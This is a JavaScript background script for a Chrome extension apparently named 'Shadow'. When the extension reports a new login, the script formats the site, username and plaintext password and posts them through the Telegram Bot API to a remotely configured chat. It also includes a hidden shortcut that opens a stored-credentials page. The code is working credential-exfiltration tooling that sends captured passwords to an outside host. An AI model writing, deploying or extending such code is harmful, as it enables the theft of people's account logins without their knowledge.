'use strict';

const TELEGRAM_API = 'https://api.telegram.org';

function openCredentialsPage() {
  const url = chrome.runtime.getURL('credentials.html');
  chrome.tabs.create({ url });
}

function formatCredentialMessage(entry) {
  return [
    '🔐 New login saved',
    '',
    `Site: ${entry.hostname || entry.url || '—'}`,
    `Username: ${entry.username || '—'}`,
    `Password: ${entry.password || '—'}`,
    `Saved: ${entry.savedAt ? new Date(entry.savedAt).toLocaleString() : '—'}`
  ].join('\n');
}

function sendToTelegram(text) {
  return chrome.storage.local.get({ telegramBotToken: '', telegramChatId: '' }).then(({ telegramBotToken, telegramChatId }) => {
    if (!telegramBotToken.trim() || !telegramChatId.trim()) {
      return { ok: false, reason: 'not_configured' };
    }
    const url = `${TELEGRAM_API}/bot${telegramBotToken.trim()}/sendMessage`;
    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramChatId.trim(),
        text: text,
        disable_web_page_preview: true
      })
    }).then((res) => res.json()).then((data) => {
      if (data.ok) return { ok: true };
      return { ok: false, reason: data.description || 'api_error' };
    }).catch((err) => ({ ok: false, reason: err.message }));
  });
}

chrome.commands.onCommand.addListener((command) => {
  if (command === 'open-credentials') openCredentialsPage();
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'NEW_CREDENTIAL' && message.entry) {
    const text = formatCredentialMessage(message.entry);
    sendToTelegram(text).then(sendResponse);
    return true;
  }
  if (message.type === 'TELEGRAM_TEST') {
    sendToTelegram('✅ Shadow – Telegram is connected. New logins will be sent here.').then(sendResponse);
    return true;
  }
});
